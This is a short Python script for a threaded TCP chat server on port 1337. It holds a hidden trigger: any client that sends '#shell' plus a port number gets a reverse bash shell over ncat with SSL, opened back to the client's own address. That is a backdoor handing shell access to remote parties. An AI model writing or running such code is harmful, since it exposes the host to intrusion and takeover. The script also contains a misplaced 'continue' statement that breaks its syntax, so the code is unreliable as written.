#!/usr/bin/python3
import socket
import _thread
import subprocess
import os

def rev_shell(ip,port):
    command = f'ncat -e /bin/bash --ssl {ip} {port}'
        continue
    os.system(command)

def new_connection(conn,addr):
    print(f'connection from {addr[0]}:{addr[1]}')
    try:
        while True:
            data = conn.recv(1024)
            print(f"From {addr[0]} : {data.decode('utf-8')}")
            if '#shell' in data.decode('utf-8'):
                rev_port = data.decode('utf-8')[6:]
                _thread.start_new_thread(rev_shell,((addr[0],rev_port)))

            message = input(f"To {addr[0]}: ")
            conn.send((f"From server: " + message + "\n").encode())
        conn.close()
    except:
        print(f"connection closed with {addr[0]}")

s = socket.socket()
ip = '0.0.0.0'
port = 1337

s.bind((ip,port))

s.listen(5)

while True:
    conn,addr = s.accept()
    _thread.start_new_thread(new_connection,((conn,addr)))
s.close()
